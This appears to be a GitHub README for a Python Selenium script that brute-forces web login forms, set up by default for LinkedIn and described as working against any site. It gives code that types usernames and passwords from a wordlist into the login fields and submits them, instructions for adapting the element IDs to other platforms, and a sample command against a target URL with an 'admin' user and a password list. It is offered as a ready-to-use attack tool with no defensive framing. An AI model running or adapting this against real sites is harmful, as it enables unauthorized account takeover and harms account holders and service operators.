# Selenium-Brute-Force
A simple python script for doing brute-force attack using selenium.

## Help
- The default script is useful for Linkedin, but it works for everything. For other platforms, it needs to extract username id, password id, and login button class using browser inspector.

![](https://github.com/mohammadkamrani/Selenium-Brute-Force/blob/main/file/help.jpg)<br />

put them in code.
```python
username = driver.find_element_by_id("username")		
username.clear()
print("username: "+curuser)
username.send_keys(curuser)		
password = driver.find_element_by_id("password")
password.clear()
print("password: "+passw+"\n")
password.send_keys(passw)			
driver.find_element_by_class_name('login__form_action_container').click()
```
- check chromedriver version with your chrome, if there is a incompatibility, use appropriate version here <br />
https://chromedriver.chromium.org/downloads
## Usage
To get a list of basic options and switches use:
```python
selenium-brute.py -h
```
sample:
```
selenium-brute.py -t https://target.com -u admin -p pass.txt
```
![](https://github.com/mohammadkamrani/Selenium-Brute-Force/blob/main/file/video.gif)

